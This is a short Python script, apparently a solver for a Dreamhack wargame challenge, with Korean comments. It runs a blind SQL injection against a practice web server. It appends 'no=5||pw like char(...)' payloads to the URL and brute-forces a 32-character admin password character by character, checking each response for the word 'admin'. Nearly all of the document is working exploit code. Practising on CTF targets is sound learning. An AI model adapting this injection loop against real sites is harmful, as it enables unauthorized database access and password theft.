import requests
from urllib import parse


# 세션활성화
s = requests.Session()

host = "http://host3.dreamhack.games:19463/?no=5||"


# 패스워드 길이는 총 32
# http://host3.dreamhack.games:11194/?no=5||length(pw)=32

# 반복문은 1부터 32까지
# 각 문자열을 char형으로 파악해야하므로 47? 48? 부터 122 까지 하는게 맞는거 아닌감....


'''
res = s.get(host + parse.quote("length(pw)=32"))
if "admin" in res.text :    
    print("test complete!")
'''

print("injection start!!")
char_list = "abcdefghijklmnopqrstuvwxyz0123456789"
pw = ""
pw2 = ""
for i in range(1,33) :
    for j in char_list:
        param = "pw like char({}{}, {})".format(pw, ord(j), ord("%"))  # mysql char 함수를 쓰므로 파이썬에서 넘겨줄떄 ord로 정수값으로 넘겨줘야함..!        
        res = s.get(host + parse.quote(param))   # 호출

        if "admin" in res.text :
            pw2 = pw2 + j
            print(pw2)
            pw = pw + str(ord(j)) + ","  # pw에 값을 계속 이어 붙여서 char로 확인..

print(pw2)
print("injection end!!")